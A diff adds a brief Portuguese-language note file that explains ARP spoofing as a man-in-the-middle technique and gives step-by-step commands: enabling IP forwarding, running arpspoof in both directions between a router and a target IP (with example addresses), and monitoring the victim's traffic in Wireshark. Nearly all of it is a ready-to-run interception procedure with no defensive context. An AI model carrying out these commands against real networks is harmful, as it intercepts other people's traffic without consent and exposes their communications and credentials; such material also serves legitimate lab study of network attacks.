@@ -1,0 +1,27 @@
+ARP SPOOFING É A FALSIFICAÇÃO DE ARP. ONDE VOCÊ FICA NO MEIO DE UMA COMUNICAÇÃO ENTRE UM REMETENTE E UM DESTINATARIO, TAMBÉM CONHECIDA COMO MAN-IN-THE-MIDDLE.
+	
+PARA VER A TABELA ARP DO SUA MÁQUINA:
+		arp -a
+
+
+	1.CONFIGURAR:
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+		
+	2.INICIAR O ATAQUE ARP SPOOFING.
+	
+		1.SPOOFAR O ROTEADOR
+			
+			COMANDO: arpspoof -i <interface> -t <ip_roteador> <ip_alvo>
+		
+			 EX: arpspoof -i eth0 -t 192.168.2.1 192.168.2.11
+			 
+		2.ABRIR OUTRO TERMINAL
+		
+		3.SPOOFAR O ALVO
+			
+			COMANDO: arpspoof -i <interface> -t <ip_alvo> <ip_roteador>
+			
+			EX:  arpspoof -i eth0 -t 192.168.2.11 192.168.2.1
+			
+	3.MONITORAR O TRAFEGO DO ALVO PELO WIRESHARK.
+		
